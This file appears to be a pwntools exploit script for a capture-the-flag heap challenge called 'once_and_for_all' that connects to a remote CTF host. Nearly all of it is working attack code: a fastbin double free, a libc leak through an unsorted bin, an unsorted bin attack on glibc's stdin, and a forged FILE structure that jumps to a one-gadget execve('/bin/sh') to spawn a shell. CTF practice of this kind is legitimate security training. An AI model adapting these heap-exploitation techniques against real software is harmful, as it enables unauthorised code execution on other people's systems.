#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './once_and_for_all'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'einstein-bd91179989a5c1ab.deploy.phreaks.fr', 443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    # set sysroot /proc/{pid}/root
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/dreamdiary2"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def alloc(idx, size, data, hang=False):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"Choose an index: ", str(idx).encode())
    io.sendlineafter(b"How much space do you need for it: ", str(size).encode())
    if not hang:
        io.sendlineafter(b"Input your weapon's details: \n", data)

def free_then_alloc(idx, size, data, alloc=False):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"Choose an index: ", str(idx).encode())
    io.sendlineafter(b"How much space do you need for this repair: ", str(size).encode())
    if alloc:
        io.sendlineafter(b"Input your weapon's details: \n", data)
        io.sendlineafter(b">> ", b"1")

def show(idx):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b"Choose an index: ", str(idx).encode())

def allochuge(size):
    io.sendlineafter(b">> ", b"4")
    io.sendlineafter(b"How much space do you need for this massive weapon: ", str(size).encode())

def exploit():
    # nasm's solve script & write up https://ctftime.org/writeup/33908
    global io
    io = initialize()
    with log.progress("Preparing chunk for fastbin dup"), context.silent:
        alloc(0, 0x38, b"A")
        alloc(1, 0x38, b"B")
        alloc(2, 0x28, b"C") # Victim

        #For future unsorted bins
        alloc(4, 0x38, b"D")
        alloc(5, 0x28, b"E")

        alloc(10, 0x28, p64(0) + p64(0x21)) # barrier

    with log.progress("Fastbin dup & overwrite chunk header for unsorted bins"), context.silent:
        #Fastbin dup
        free_then_alloc(1, 0x238, b"")
        free_then_alloc(0, 0x238, b"")
        free_then_alloc(1, 0x238, b"") #Double free
        
        free_then_alloc(2, 0x238, b"") # For overwrite future unsorted bins
        alloc(6, 0x38, b"\x00"*0x38  + b"\xb1") # Overwrite idx 2 header to 0xb1
 
    with log.progress("Fill tcache & making unsorted bin to leak libc"), context.silent:
        for i in range(7): #Fill tcache
            free_then_alloc(2, 0x238, b"")
        free_then_alloc(2, 0x238, b"") #Unsorted bins
        show(2)
        libc_leak = u64(io.recvline().strip().ljust(8, b"\x00")) #Leak libc
        libc.address = libc_leak - 0x3ebca0
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base: %#x", libc.address)

    with log.progress("Unsorted bins attack to stdin + 0x40"), context.silent:
        alloc(7, 0x38, b"A") # pop it to access to chunk_1
        alloc(8, 0x38, b"\x00"*0x38 + b"\x31") # restore valid fastbin chunk part of the 0x30 freelist put it back to the fastbin
        alloc(9, 0x28, p64(libc_leak) + p64(libc.sym["_IO_2_1_stdin_"] + 0x40 - 0x10))

    with log.progress("Clean fastbin"), context.silent:
        free_then_alloc(5, 0x238, b"")
        free_then_alloc(4, 0x238, b"")
        alloc(11, 0x38, b"\x00"*0x38 + b"\x40")
        free_then_alloc(5, 0x238, b"")
        alloc(12, 0x38, p64(0))
        free_then_alloc(4, 0x238, b"")
        alloc(13, 0x38, b"\x00"*0x38 + b"\x30")
        alloc(14, 0x28, b"\x00")

    with log.progress("Get shell"), context.silent:
        alloc(3, 0x28, b"\x00", hang=True)
        io.sendline(b"") 
        io.recvuntil(b">> ")
        io.send( 
            b"4\n\x00\x00\x00" + 
            p64(libc.bss()) + 
            p64(0xffffffffffffffff) + 
            p64(0) + 
            p64(libc.sym["_IO_2_1_stdin_"] + 0xe0) + 
            p64(0) * 3 + 
            p64(0x00000000ffffffff) + 
            p64(0) * 2 + 
            p64(libc.sym["_IO_file_jumps"]) + 
            p64(0) * 0x2a +  
            p64(libc.address + 0x10a38c) # <- one-gadget
        )
        """
        0x10a38c execve("/bin/sh", rsp+0x70, environ)
        constraints:
        [rsp+0x70] == NULL
        """
    io.interactive()

if __name__ == '__main__':
    exploit()
